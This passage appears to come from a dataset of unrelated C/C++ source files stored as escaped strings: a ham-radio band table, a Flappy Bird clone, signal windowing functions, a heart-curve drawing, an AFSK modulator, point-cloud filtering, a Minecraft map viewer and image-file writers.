\"160M\", 1800000, 2000000, 0, 1860000, 1, 1, 0, 1, 0, 0 },                    // 160m\n  { \"80M\", 3500000, 4000000, 0, 3573000, 1, 1, 0, 1, 0, 0 },                     // 80m\n  { \"60M\", 5351000, 5367000, 0, 5351000, 1, 1, 0, 1, 0, 0 },                     // 60m\n  { \"40M\", 7000000, 7300000, 0, 7074000, 1, 1, 0, 1, 0, 0 },                     // 40m\n  { \"30M\", 10100000, 10150000, 0, 10136000, 1, 1, 0, 1, 0, 0 },                  // 30m\n  { \"20M\", 14000000, 14350000, 0, 14074000, 1, 1, 0, 1, 0, 0 },                  // 20m\n  { \"17M\", 18068000, 18168000, 0, 18100000, 1, 1, 0, 1, 0, 0 },                  // 17m\n  { \"15M\", 21000000, 21450000, 0, 21074000, 1, 1, 0, 1, 0, 0 },                  // 15m\n  { \"12M\", 24890000, 24990000, 0, 24891500, 1, 1, 0, 1, 0, 0 },                  // 12m\n  { \"10M\", 28000000, 29700000, 0, 28074000, 1, 1, 0, 1, 0, 0 },                  // 10m\n  { \"6M\", 50000000, 54000000, 0, 50125000, 1, 1, 0, 1, 0, 0 },                   // 6m\n  { \"FM\", 88000000, 108000000, 0, 95700000, 6, 1, 0, 1, 0, 0 },                  // FM\n  { \"Air\", 118000000, 137000000, 0, 119200000, 2, 1, 0, 1, 0, 0 },               // AIR\n  { \"2M\", 144000000, 148000000, 0, 144200000, 1, 1, 0, 1, 0, 0 },                // 2m\n  { \"1.25M\", 222000000, 225000000, 194000000, 222100000, 1, 1, 0, 1, 0, 0 },     // 222\n  { \"70cm\", 430000000, 450000000, 0, 432100000, 1, 1, 0, 1, 0, 0 },              // 430/440\n  { \"33cm\", 902000000, 928000000, 758000000, 903100000, 1, 1, 0, 1, 0, 0 },      // 902\n  { \"23cm\", 1240000000, 1300000000, 1152000000, 1296100000, 1, 1, 0, 1, 0, 0 },  // 1296Mhz\n  { \"13cm\", 2300000000, 2450000000, 1870000000, 2304100000, 1, 1, 0, 1, 0, 0 },  // 2.3 and 2.4GHz\n  { \"9cm\", 3300000000, 3500000000, 0, 3301000000, 1, 1, 0, 1, 0, 0 },            // 3.3GHz\n  { \"6cm\", 5650000000, 5925000000, 0, 5760100000, 1, 1, 0, 1, 0, 0 },            // 5.7GHz\n  { \"3cm\", 10000000000, 10500000000, 0, 10368100000, 1, 1, 0, 1, 0, 0 },         // 10GHz\n  { \"24G\", 24000000000, 24002000000, 0, 24031000000, 1, 1, 0, 1, 0, 0 },         // 24GHz\n  { \"47G\", 47000000000, 47002000000, 0, 47192100000, 1, 1, 0, 1, 0, 0 },         // 47GHz\n  { \"76G\", 76000000000, 76002000000, 0, 76000000000, 1, 1, 0, 1, 0, 0 },         // 76GHz\n  { \"122G\", 122000000000, 122002000000, 0, 122001000000, 1, 1, 0, 1, 0, 0 },     // 122GHz\n  { \"GENE\", 0, 123000000000, 0, 432000000, 1, 1, 0, 1, 0, 0 }                    // 0 to 122GHz\n};\n\nchar title[17] = \"CIV Band Decoder\";  // make exactly 16 chards if used as the BT device name\nuint16_t baud_rate;                 //Current baud speed\nuint32_t readtimeout = 10;          //Serial port read timeout\n\n//extern uint64_t frequency;                 //Current frequency in Hz\nuint8_t band = B_GENERAL;\nuint32_t timer;\n//uint16_t background_color = TFT_BLACK;\n//uint16_t text_color = TFT_WHITE;\nbool PTT = false;\nbool prev_PTT = true;\nextern char Grid_Square[];\nbool BLE_buff_flag = false;\n\nuint8_t radio_address = RADIO_ADDR;  //Transceiver address.  0 allows auto-detect on first messages form radio\nbool  auto_address = false;        // If true, detects new radio address on connection mode chan",
    "#include <SFML/Audio/Sound.hpp>\n#include <SFML/Audio/SoundBuffer.hpp>\n#include <SFML/Graphics.hpp>\n#include <SFML/Graphics/Color.hpp>\n#include <SFML/Graphics/Sprite.hpp>\n#include <SFML/Graphics/Texture.hpp>\n#include <SFML/System/Clock.hpp>\n#include <SFML/System/Time.hpp>\n#include <SFML/Window/Event.hpp>\n#include <SFML/Window/Keyboard.hpp>\n#include <SFML/Audio.hpp>\n#include <algorithm>\n#include <string>\n#include <vector>\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <fstream>\n\n#include \"bird.h\"\n#include \"walls.h\"\n\nsf::Texture Wall::texture;\n\n#define screen_width 500\n\nvoid spawnWalls(sf::RenderWindow& window, std::vector<Wall>& walls, float& wallX)\n{\n    if (wallX < window.getSize().x / 2.f)\n    {\n        float wallY = (rand() % (600 - 200 + 1) + 200);\n        walls.push_back(Wall(window.getSize().x, wallY));\n        walls.push_back(Wall(window.getSize().x, wallY - 880));\n    }\n}\n\nvoid saveHighScore(int highscore)\n{\n    std::ofstream outFile(\"save/highscore.txt\");\n    if (outFile.is_open())\n    {\n        outFile << highscore;\n        outFile.close();\n    }\n}\n\nint loadHighScore()\n{\n    std::ifstream inFile(\"save/highscore.txt\"); //\n    int highscore = 0;\n    if (inFile.is_open())\n    {\n        inFile >> highscore;\n        inFile.close();\n    }\n\n    return highscore;\n}\n\nint main()\n{\n    srand(static_cast<unsigned>(time(0)));\n\n    sf::RenderWindow window(sf::VideoMode(screen_width, 800), \"Flappy Bird\", sf::Style::Default,\n                            sf::ContextSettings(0, 0, 8));\n\n    window.setFramerateLimit(60);\n    window.setKeyRepeatEnabled(false);\n\n    sf::Clock timer;\n    sf::Clock gameTimer;\n\n    Bird bird(45, 45);\n    std::vector<Wall> walls;\n\n    bool gameOver = false;\n    bool mainMenu = true;\n    bool gamePaused = false;\n\n    float wallX = 0;\n    int score = 0;\n    int highscore = loadHighScore();\n\n    bool isPassed = false;\n    bool isDead = false;\n    bool hitWall = false;\n    bool stupid = false;\n    float currentTime = 0;\n\n    sf::Font font;\n    if (!font.loadFromFile(\"res/font/Neon.ttf\"))\n    {\n        std::cerr << \"Could not load font\" << std::endl;\n        return 1;\n    }\n    font.setSmooth(true);\n\n    sf::Texture bgTexture;\n    if (!bgTexture.loadFromFile(\"res/sprite/Background/Background7.png\"))\n    {\n        std::cout << \"back ground texture failed\" << std::endl;\n        system(\"pause\");\n    }\n    bgTexture.setRepeated(true);\n\n    sf::Sprite bg(bgTexture);\n    bg.setTextureRect(sf::IntRect(0, 0, window.getSize().x - (window.getSize().x / 3.f),\n                                  window.getSize().y - (window.getSize().y / 2.f)));\n    bg.setScale(window.getSize().x / 256.f, window.getSize().y / 256.f);\n\n    const float bgScrollSpeed = 100.f;\n\n    sf::Text gameOverText;\n    gameOverText.setFont(font);\n    gameOverText.setString(\"Game Over!\\nPress Space to Restart\");\n    gameOverText.setCharacterSize(50);\n    gameOverText.setFillColor(sf::Color::White);\n    gameOverText.setStyle(sf::Text::Bold);\n    gameOverText.setPosition(window.getSize().x / 2.f - gameOverText.getLocalBounds().width / 2,\n                             window.getSize().y / 2.f - gameOverText.getLocalBounds().height / 2);\n    gameOverText.setOutlineColor(sf::Color::Black);\n    gameOverText.setOutlineThickness(5.f);\n\n    sf::Text mainMenuText;\n    mainMenuText.setFont(font);\n    mainMenuText.setString(\"Flappy Bird\\nPress Space to start\");\n    mainMenuText.setCharacterSize(50);\n    mainMenuText.setFillColor(sf::Color::White);\n    mainMenuText.setStyle(sf::Text::Bold);\n    mainMenuText.setPosition(window.getSize().x / 2.f - mainMenuText.getLocalBounds().width / 2,\n                             window.getSize().y / 2.f - mainMenuText.getLocalBounds().height / 2);\n    mainMenuText.setOutlineColor(sf::Color::Black);\n    mainMenuText.setOutlineThickness(5.f);\n\n    sf::Text pausedText;\n    pausedText.setFont(font);\n    pausedText.setString(\"Game Paused\\nPress Escape or P\");\n    pausedText.setCharacterSize(50);\n    pausedText.setFillColor(sf::Color::White);\n    pausedText.setStyle(sf::Text::Bold);\n    pausedText.setPosition(window.getSize().x / 2.f - mainMenuText.getLocalBounds().width / 2,\n                           window.getSize().y / 2.f - pausedText.getLocalBounds().height / 2);\n    pausedText.setOutlineColor(sf::Color::Black);\n    pausedText.setOutlineThickness(5.f);\n\n    sf::Text scoreText;\n    scoreText.setFont(font);\n    scoreText.setCharacterSize(30);\n    scoreText.setFillColor(sf::Color::White);\n    scoreText.setPosition(10, 10);\n    scoreText.setOutlineColor(sf::Color::Black);\n    scoreText.setOutlineThickness(5.f);\n\n    sf::Text highscoreText;\n    highscoreText.setFont(font);\n    highscoreText.setCharacterSize(30);\n    highscoreText.setFillColor(sf::Color::White);\n    highscoreText.setPosition(10, 50);\n    highscoreText.setOutlineColor(sf::Color::Black);\n    highscoreText.setOutlineThickness(5.f);\n\n    sf::SoundBuffer pointBuffer;\n    pointBuffer.loadFromFile(\"res/sound/sfx_point.wav\");\n    sf::Sound pointSoun",
    "////////////////////////////////////////////////////////\n// Includes\n////////////////////////////////////////////////////////\n#include \"../include/windowing.h\"\n#include <cmath>\n\n\n////////////////////////////////////////////////////////\n// Private Function Definitions\n////////////////////////////////////////////////////////\nvoid applyHanningWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (0.5 * (1 - cos(2 * M_PI * i / (numSamples - 1)))));\n        signalSeries->replace(i++, point);\n    }\n}\n\nvoid applyHammingWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (0.54 - 0.46 * cos(2 * M_PI * i / (numSamples - 1))));\n        signalSeries->replace(i++, point);\n    }\n}\n\nvoid applyBlackmanWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (0.42 - 0.5 * cos(2 * M_PI * i / (numSamples - 1)) \n                                + 0.08 * cos(4 * M_PI * i / (numSamples - 1))));\n        signalSeries->replace(i++, point);\n    }\n}\n\nvoid applyBartlettWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (1.0 - fabs((i - (numSamples - 1) / 2.0) / ((numSamples - 1) / 2.0))));\n        signalSeries->replace(i++, point);\n    }\n}\n\nvoid applyBlackmanHarrisWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (0.35875 - 0.48829 * cos(2 * M_PI * i / (numSamples - 1)) + \n                                0.14128 * cos(4 * M_PI * i / (numSamples - 1)) - \n                                0.01168 * cos(6 * M_PI * i / (numSamples - 1))));\n        signalSeries->replace(i++, point);\n    }\n}\n\nvoid applyFlatTopWindow(QLineSeries *signalSeries) {\n    int numSamples = signalSeries->count();\n    int i = 0;\n    for (QPointF &point : signalSeries->points()) {\n        point.setY(point.y() * (1 - 1.93 * cos(2 * M_PI * i / (numSamples - 1)) + \n                                1.29 * cos(4 * M_PI * i / (numSamples - 1)) - \n                                0.388 * cos(6 * M_PI * i / (numSamples - 1)) + \n                                0.0322 * cos(8 * M_PI * i / (numSamples - 1))));\n        signalSeries->replace(i++, point);\n    }\n}\n\n// double _besseli0(double x) {\n//     double sum = 1.0;\n//     double u = 1.0;\n//     for (int k = 1; k < 50; ++k) {\n//         u = u * (x * x) / (4.0 * k * k);\n//         sum += u;\n//     }\n//     return sum;\n// }\n\n// void applyKaiserWindow(QLineSeries *signalSeries, int numSamples, double beta) {\n//     double denom = besseli0(beta);\n//     for (int i = 0; i < numSamples; ++i) {\n//         double ratio = (2.0 * i) / (numSamples - 1) - 1.0;\n//         signalSeries[i] *= besseli0(beta * sqrt(1 - ratio * ratio)) / denom;\n//     }\n// }\n\n\n////////////////////////////////////////////////////////\n// Global Variables\n////////////////////////////////////////////////////////\nQMap<QString, std::function<void(QtCharts::QLineSeries*)>> windowingFuncs = {\n    {\"Hanning\", applyHanningWindow},\n    {\"Hamming\", applyHammingWindow},\n    {\"Blackman\", applyBlackmanWindow},\n    {\"Bartlett\", applyBartlettWindow},\n    {\"Blackman-Harris\", applyBlackmanHarrisWindow},\n    {\"Flat Top\", applyFlatTopWindow}\n};\n",
    "#include <stdio.h>\r\n#include <conio.h>\r\n#include <graphics.h>\r\n//(x2+y2-1)3+x2y3==0\r\n\r\n#define start_k 50\r\n#define maxk 300\r\nint deltak = 10;\r\nfloat width = 1000, height = 800;\r\nint flag = 1;\r\nint isfirst = 0;\r\n\r\nvoid aixin(int k) {\r\n\tsetlinecolor(RGB(255 - k / 1.5, 0, 0));\r\n\tfloat x, y, z;\r\n\t//x>-1.5 && x<1.5,y>=0 && y<1.5,z<=0 && z>=-1\r\n\tfor (x = -1.139001 * k; x <= 1.139 * k; x++) {\r\n\t\tBeginBatchDraw();\r\n\t\tfloat x0 = x / k;\r\n\t\tif (x <= -k || x >= k) {\r\n\t\t\tfor (y = -1.5 * k; y <= 0; y++) {\r\n\t\t\t\tfloat y0 = y / k;\r\n\t\t\t\tfloat a = x0 * x0 + y0 * y0 - 1;\r\n\t\t\t\tif (a * a * a + x0 * x0 * y0 * y0 * y0 <= 0) {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor (z = 0; z > -0.5 * k; z--) {\r\n\t\t\t\tfloat z0 = z / k;\r\n\t\t\t\tfloat a = x0 * x0 + z0 * z0 - 1;\r\n\t\t\t\tif (a * a * a + x0 * x0 * z0 * z0 * z0 <= 0) {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tfor (y = -1.5 * k; y <= 0; y++) {\r\n\t\t\t\tfloat y0 = y / k;\r\n\t\t\t\tfloat a = x0 * x0 + y0 * y0 - 1;\r\n\t\t\t\tif (a * a * a + x0 * x0 * y0 * y0 * y0 <= 0) {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor (z = k; z >= 0; z--) {\r\n\t\t\t\tfloat z0 = z / k;\r\n\t\t\t\tfloat a = x0 * x0 + z0 * z0 - 1;\r\n\t\t\t\tif (a * a * a + x0 * x0 * z0 * z0 * z0 <= 0) {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tline(x + width / 2, y + height / 2, x + width / 2, z + height / 2);\r\n\t}\r\n\tFlushBatchDraw();\r\n\tSleep(100);\r\n}\r\n\r\nvoid draw(int k /*????*/) {\r\n\tif (k > maxk) {\r\n\t\tflag = -flag;\r\n\t\treturn;\r\n\t}\r\n\tif (k <= start_k && isfirst != 0) {\r\n\t\tflag = -flag;\r\n\t\treturn;\r\n\t}\r\n\tif (isfirst == 0) {\r\n\t\tisfirst = 1;\r\n\t}\r\n\taixin(k);\r\n\tcleardevice();\r\n\twhile (1) {\r\n\t\tif (flag > 0) {\r\n\t\t\tdraw(k + deltak);\r\n\t\t}\r\n\t\tif (flag < 0) {\r\n\t\t\tdraw(k - deltak);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid startup() {\r\n\tinitgraph(width, height);\r\n\tsetbkcolor(BLACK);\r\n\tcleardevice();\r\n}\r\n\r\nint main() {\r\n\tstartup();\r\n\tdraw(start_k);\r\n\t_getch();\r\n\treturn 0;\r\n}",
    "// Copyright 2020 Rob Riggs <rob@mobilinkd.com>\n// All rights reserved.\n\n#include \"AFSKModulator.hpp\"\n#include \"AudioLevel.hpp\"\n\nnamespace mobilinkd { namespace tnc {\n\nvoid AFSKModulator::init(const kiss::Hardware& hw)\n{\n    audio::setAudioOutputLevel();\n    set_twist(hw.tx_twist);\n\n    // Configure 72MHz clock for 26.4ksps.\n    SysClock72();\n    __HAL_TIM_SET_AUTORELOAD(&htim7, 2726);\n    __HAL_TIM_SET_PRESCALER(&htim7, 0);\n    mobilinkd::dacTimerAdjust = dacTimerAdjust; \n\n    DAC_ChannelConfTypeDef sConfig;\n\n    sConfig.DAC_SampleAndHold = DAC_SAMPLEANDHOLD_DISABLE;\n    sConfig.DAC_Trigger = DAC_TRIGGER_NONE;\n    sConfig.DAC_OutputBuffer = DAC_OUTPUTBUFFER_ENABLE;\n    sConfig.DAC_ConnectOnChipPeripheral = DAC_CHIPCONNECT_ENABLE;\n    sConfig.DAC_UserTrimming = DAC_TRIMMING_FACTORY;\n    if (HAL_DAC_ConfigChannel(&hdac1, &sConfig, DAC_CHANNEL_1) != HAL_OK) {\n        CxxErrorHandler();\n    }\n\n    if (HAL_DAC_SetValue(&hdac1, DAC_CHANNEL_1, DAC_ALIGN_12B_R, 2048) != HAL_OK)\n        CxxErrorHandler();\n    if (HAL_DAC_Start(&hdac1, DAC_CHANNEL_1) != HAL_OK)\n        CxxErrorHandler();\n}\n\n}} // mobilinkd::tnc\n",
    "#include \"point_cloud_processor.h\"\n#include <pcl/filters/passthrough.h>\n#include <pcl/segmentation/sac_segmentation.h>\n#include <pcl/filters/extract_indices.h>\n#include <pcl/segmentation/extract_clusters.h>\n#include <pcl/filters/statistical_outlier_removal.h>\n#include <iostream>\n\nPointCloudProcessor::PointCloudProcessor() {\n    // Constructor implementation if needed\n}\n\nvoid PointCloudProcessor::segmentPointCloud(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\n    // Segment the point cloud into different parts\n    // This is a placeholder for segmentation algorithm, can be extended as needed\n}\n\nvoid PointCloudProcessor::filterPointCloud(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\n    // Apply a PassThrough filter to remove NaNs and limit the region of interest\n    pcl::PassThrough<pcl::PointXYZ> pass;\n    pass.setInputCloud(cloud);\n    pass.setFilterFieldName(\"z\");\n    pass.setFilterLimits(0.0, 1.5);\n    pass.filter(*cloud);\n\n    // Apply a StatisticalOutlierRemoval filter to remove noise\n    pcl::StatisticalOutlierRemoval<pcl::PointXYZ> sor;\n    sor.setInputCloud(cloud);\n    sor.setMeanK(50);\n    sor.setStddevMulThresh(1.0);\n    sor.filter(*cloud);\n}\n\nvoid PointCloudProcessor::clusterPointCloud(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\n    // Euclidean Cluster Extraction\n    pcl::search::KdTree<pcl::PointXYZ>::Ptr tree(new pcl::search::KdTree<pcl::PointXYZ>);\n    tree->setInputCloud(cloud);\n\n    std::vector<pcl::PointIndices> cluster_indices;\n    pcl::EuclideanClusterExtraction<pcl::PointXYZ> ec;\n    ec.setClusterTolerance(0.02); // 2cm tolerance\n    ec.setMinClusterSize(100);\n    ec.setMaxClusterSize(25000);\n    ec.setSearchMethod(tree);\n    ec.setInputCloud(cloud);\n    ec.extract(cluster_indices);\n\n    // Process clusters (e.g., color each cluster differently)\n    int j = 0;\n    for (const auto& indices : cluster_indices) {\n        pcl::PointCloud<pcl::PointXYZ>::Ptr cluster(new pcl::PointCloud<pcl::PointXYZ>);\n        for (const auto& idx : indices.indices)\n            cluster->points.push_back(cloud->points[idx]);\n        cluster->width = cluster->points.size();\n        cluster->height = 1;\n        cluster->is_dense = true;\n\n        std::cout << \"Cluster \" << j << \" has \" << cluster->points.size() << \" points.\" << std::endl;\n        j++;\n    }\n}\n\nvoid PointCloudProcessor::separateGround(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\n    removeGroundPlane(cloud);\n}\n\nvoid PointCloudProcessor::removeGroundPlane(pcl::PointCloud<pcl::PointXYZ>::Ptr cloud) {\n    // Plane segmentation to separate ground\n    pcl::SACSegmentation<pcl::PointXYZ> seg;\n    pcl::PointIndices::Ptr ground_indices(new pcl::PointIndices);\n    pcl::ModelCoefficients::Ptr coefficients(new pcl::ModelCoefficients);\n    seg.setOptimizeCoefficients(true);\n    seg.setModelType(pcl::SACMODEL_PLANE);\n    seg.setMethodType(pcl::SAC_RANSAC);\n    seg.setDistanceThreshold(0.02);\n\n    seg.setInputCloud(cloud);\n    seg.segment(*ground_indices, *coefficients);\n\n    if (ground_indices->indices.size() == 0) {\n        std::cerr << \"Could not estimate a planar model for the given dataset.\" << std::endl;\n        return;\n    }\n\n    pcl::ExtractIndices<pcl::PointXYZ> extract;\n    extract.setInputCloud(cloud);\n    extract.setIndices(ground_indices);\n    extract.setNegative(false);\n\n    pcl::PointCloud<pcl::PointXYZ>::Ptr ground_cloud(new pcl::PointCloud<pcl::PointXYZ>);\n    extract.filter(*ground_cloud);\n\n    // Optionally save the ground point cloud to a file\n    pcl::io::savePCDFileASCII(\"ground.pcd\", *ground_cloud);\n\n    // Remove ground points from the original cloud\n    extract.setNegative(true);\n    extract.filter(*cloud);\n}\n",
    "#include \"Main.h\"\n#include \"Window.hpp\"\n#include \"Renderer.hpp\"\n#include \"Gui.hpp\"\n#include \"FileLoading.hpp\"\n#include \"Types/Time.h\"\n#include \"Types/VectorTypes.h\"\n\nconst char* MC_MAPPER_VERSION = \"Alpha 0.0.1\";\n\nint screen_width = 854 * 2, screen_height = 480 * 2;\n\nWINDOW main_window;\nRENDERER main_renderer;\nImGui_CONTEXT main_gui;\n\nLEVEL_DATA currentLVLFile;\nTime LevelLastPlay;\n\nCHUNK_DATA zero_zero; // Spawn\nCHUNK_DATA one_zero;\nCHUNK_DATA two_zero;\nCHUNK_DATA three_zero;\nCHUNK_DATA four_zero;\nCHUNK_DATA five_zero;\nCHUNK_DATA six_zero;\n\nCHUNK_DATA zero_oner;\nCHUNK_DATA one_oner;\nCHUNK_DATA two_oner;\nCHUNK_DATA three_oner;\nCHUNK_DATA four_oner;\nCHUNK_DATA five_oner;\nCHUNK_DATA six_oner;\n\n// are we currently loading chunks?\nbool loading_Chunks = false;\n// the chunk currently being loaded\nint loading_Chunk = 0;\n\nvector2_int scroll;\n\n#define DEBUG_MULTITHREADING\n\nbool initMain() {\n\tbool success = true;\n\n\tstd::cout << \"Minecraft Alpha Level Mapper by TtEL\" << std::endl;\n\tstd::cout << \"Software Version: \" << MC_MAPPER_VERSION << std::endl << std::endl;\n\t//Initialize SDL\n\tstd::cout << \"Initalizing SDL... \";\n\tif (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_GAMECONTROLLER) < 0)\n\t{\n\t\tstd::cout << \"failure\" << std::endl;\n\t\tSDL_LogError(0, \"SDL could not initialize! SDL Error: %s\\n\", SDL_GetError());\n\t\tsuccess = false;\n\t}\n\telse {\n\t\tstd::cout << \"success\" << std::endl << std::endl;\n\n\t\tif (!main_gui.createContext()) {\n\t\t\tSDL_LogError(0, \"ImGui could not initialize!\\n\\n\");\n\t\t\tsuccess = false;\n\t\t}\n\t\telse {\n\t\t\tstd::cout << \"Creating window...\" << std::endl;\n\t\t\tif (!main_window.createWindow(\"MC Alpha Mapper\", screen_width, screen_height, SDL_WINDOW_SHOWN | SDL_WINDOW_RESIZABLE)) {\n\t\t\t\tsuccess = false;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tstd::cout << \"Successfully created window.\" << std::endl << std::endl;\n\t\t\t\tstd::cout << \"Creating renderer...\" << std::endl;\n\t\t\t\tif (!main_renderer.createRenderer(main_window, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC)) {\n\t\t\t\t\tsuccess = false;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tstd::cout << \"Successfully created renderer.\" << std::endl << std::endl;\n\t\t\t\t\tSDL_SetRenderDrawBlendMode(main_renderer, SDL_BLENDMODE_BLEND);\n\t\t\t\t\tif (!main_gui.initalizeForSDL2(main_window, main_renderer)) {\n\t\t\t\t\t\tSDL_LogError(0, \"ImGui SDL2 backend could not initialize!\\n\\n\");\n\t\t\t\t\t\tsuccess = false;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tImGuiIO& io = ImGui::GetIO();\n\t\t\t\t\t\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn success;\n}\n\nvoid initMainStyles() \n{\n\t// Get the style\n\tImGuiStyle& style = ImGui::GetStyle();\n\n\t//// positioning\n\tstyle.WindowRounding = 4.0f;\n\tstyle.FrameRounding = 7.0f;\n\tstyle.GrabRounding = 7.0f;\n\tstyle.CircleTessellationMaxError = 0.375f;\n\tstyle.DisplayWindowPadding = ImVec2(32.f, 32.f);\n\n\t//// opacity\n\t///\n\t// disabled item opacity\n\tstyle.DisabledAlpha = 0.25f;\n\n\t//// colors\n\tImVec4* colors = style.Colors;\n\tcolors[ImGuiCol_WindowBg] = ImVec4(0.03f, 0.11f, 0.03f, 0.80f);\n\tcolors[ImGuiCol_TitleBg] = ImVec4(0.04f, 0.27f, 0.04f, 0.82f);\n\tcolors[ImGuiCol_TitleBgActive] = ImVec4(0.16f, 0.55f, 0.14f, 1.00f);\n\tcolors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.08f, 0.00f, 0.51f);\n\tcolors[ImGuiCol_Button] = ImVec4(0.53f, 0.25f, 0.00f, 0.54f);\n\tcolors[ImGuiCol_ButtonHovered] = ImVec4(0.48f, 0.28f, 0.07f, 0.91f);\n\tcolors[ImGuiCol_ButtonActive] = ImVec4(0.60f, 0.53f, 0.11f, 1.00f);\n\tcolors[ImGuiCol_CheckMark] = ImVec4(0.26f, 1.00f, 0.31f, 1.00f);\n\tcolors[ImGuiCol_SliderGrab] = ImVec4(0.24f, 0.52f, 0.32f, 1.00f);\n\tcolors[ImGuiCol_SliderGrabActive] = ImVec4(0.26f, 0.59f, 0.38f, 1.00f);\n\tcolors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 0.90f);\n\tcolors[ImGuiCol_FrameBg] = ImVec4(0.44f, 0.49f, 0.60f, 0.54f);\n\tcolors[ImGuiCol_FrameBgHovered] = ImVec4(0.58f, 0.59f, 0.65f, 0.40f);\n\tcolors[ImGuiCol_FrameBgActive] = ImVec4(0.35f, 0.35f, 0.43f, 0.86f);\n\tcolors[ImGuiCol_ResizeGrip] = ImVec4(0.49f, 0.59f, 0.33f, 0.20f);\n\tcolors[ImGuiCol_ResizeGripHovered] = ImVec4(0.49f, 0.59f, 0.32f, 0.67f);\n\tcolors[ImGuiCol_ResizeGripActive] = ImVec4(0.49f, 0.59f, 0.31f, 0.95f);\n\tcolors[ImGuiCol_TabHovered] = ImVec4(0.26f, 0.83f, 0.82f, 0.68f);\n\tcolors[ImGuiCol_Tab] = ImVec4(0.00f, 0.51f, 0.40f, 0.86f);\n\tcolors[ImGuiCol_TabSelected] = ImVec4(0.31f, 0.51f, 0.71f, 0.97f);\n\tcolors[ImGuiCol_TabSelectedOverline] = ImVec4(1.00f, 0.54f, 0.54f, 0.42f);\n\tcolors[ImGuiCol_PopupBg] = ImVec4(0.18f, 0.18f, 0.08f, 0.94f);\n\tcolors[ImGuiCol_MenuBarBg] = ImVec4(0.41f, 0.22f, 0.00f, 1.00f);\n}\n\nvoid exitMain()\n{\n\tstd::cout << std::endl << std::endl << \"Exiting...\" << std::endl << std::endl;\n\n\tstd::cout << \"Destroying window...\" << std::endl << std::endl;\n\tmain_window.destroyWindow();\n\tstd::cout << \"Destroying renderer...\" << std::endl << std::endl;\n\tmain_renderer.destroyRenderer();\n\n\tcurrentLVLFile.closeFile();\n\t//Quit SDL subsystems\n\tSDL_Quit();\n\n\tmain_gui.shutdownContext();\n\n\tstd::cout << std::endl << std::endl << \"Goodbye!\" << std::endl << std::endl;\n}\n\n/**\n * @brief Shows this program's about menu\n * @param open - A pointer to a bool wh",
    "#include<iostream>\r\n#include<fstream>\r\n#include<filesystem>\r\n#include <sstream>\r\n#include<windows.h>\r\n#include <shlobj.h>\r\n#include<vector>\r\n#include <cstdlib>\r\n#include <sstream>\r\n#include <map>\r\n#include <set>\r\n#include <utility>\r\n#include <cmath>\r\n#include <random>\r\n//#include <algorithm>\r\nstruct TGAHeader {\r\n    uint8_t idLength = 0;\r\n    uint8_t colorMapType = 0;\r\n    uint8_t imageType = 2; // Uncompressed True-color image\r\n    uint8_t colorMapSpec[5] = {0};\r\n    uint16_t xOrigin = 0;\r\n    uint16_t yOrigin = 0;\r\n    uint16_t width;\r\n    uint16_t height;\r\n    uint8_t pixelDepth = 32;\r\n    uint8_t imageDescriptor = 0x20; // Top-left origin\r\n};\r\n\r\nvoid writeTGA(const std::string& filename, uint16_t width, uint16_t height, const std::vector<std::tuple<uint8_t,uint8_t,uint8_t,uint8_t>>& imageData) {\r\n    TGAHeader header;\r\n    header.width = width;\r\n    header.height = height;\r\n\r\n    std::ofstream file(filename, std::ios::binary);\r\n    /*if (!file) {\r\n        std::cerr << \"Error: Unable to open file for writing.\\n\";\r\n        return;\r\n    }*/\r\n\r\n    // Write the TGA header\r\n    file.write(reinterpret_cast<const char*>(&header), sizeof(header));\r\n\r\n    // Write the image data\r\n    file.write(reinterpret_cast<const char*>(imageData.data()), imageData.size()*4);\r\n\r\n    file.close();\r\n    //std::cout << \"TGA file created successfully: \" << filename << \"\\n\";\r\n}\r\n#pragma pack(push, 1) // Ensure no padding between structure fields\r\n\r\nstruct BMPFileHeader {\r\n    uint16_t fileType{0x4D42}; \r\n    uint32_t fileSize{0};      \r\n    uint16_t reserved1{0};     \r\n    uint16_t reserved2{0};     \r\n    uint32_t offsetData{54};   \r\n};\r\nstruct BMPInfoHeader {\r\n    uint32_t size{40};         \r\n    int32_t width{0};          \r\n    int32_t height{0};         \r\n    uint16_t planes{1};        \r\n    uint16_t bitCount{24};     \r\n    uint32_t compression{0};   \r\n    uint32_t sizeImage{0};     \r\n    int32_t xPixelsPerMeter{0};\r\n    int32_t yPixelsPerMeter{0};\r\n    uint32_t colorsUsed{0};    \r\n    uint32_t colorsImportant{0};\r\n};\r\n#pragma pack(pop)\r\nint printNum = 1;\r\nint start = GetTickCount();\r\nstruct 